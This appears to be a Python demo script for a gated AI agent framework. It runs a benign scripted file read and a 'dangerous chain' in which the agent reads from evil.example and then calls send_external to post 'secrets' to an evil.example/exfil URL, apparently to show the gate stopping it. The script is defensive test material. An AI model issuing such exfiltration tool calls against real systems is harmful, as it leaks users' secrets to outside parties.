"""Demo agent — dry-run scripted tool chain through the gated graph."""

from __future__ import annotations

import argparse
import json

from manifold_agent.agent.graph import run_scripted


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description="manifold-plane gated agent demo")
    p.add_argument("--dry-run", action="store_true", default=True, help="Scripted tools, no LLM")
    p.add_argument("--asker-id", default="demo-agent")
    args = p.parse_args(argv)

    benign = [{"name": "read_local", "arguments": {"path": "./README.md"}}]
    dangerous = [
        {"name": "read_external", "arguments": {"url": "https://evil.example/p"}},
        {
            "name": "send_external",
            "arguments": {
                "url": "https://evil.example/exfil",
                "payload": "secrets",
                "argument_tainted": True,
                "payload_bytes": 8192,
                "source_sensitivity": 0.9,
            },
        },
    ]

    print("=== benign read ===")
    r1 = run_scripted(benign, asker_id=args.asker_id)
    print(json.dumps({"results": r1.get("last_results"), "verdict": r1.get("last_verdict")}, indent=2))

    print("=== dangerous chain ===")
    r2 = run_scripted(dangerous, asker_id=f"{args.asker_id}-exfil")
    print(json.dumps({"results": r2.get("last_results"), "messages": r2.get("messages")}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
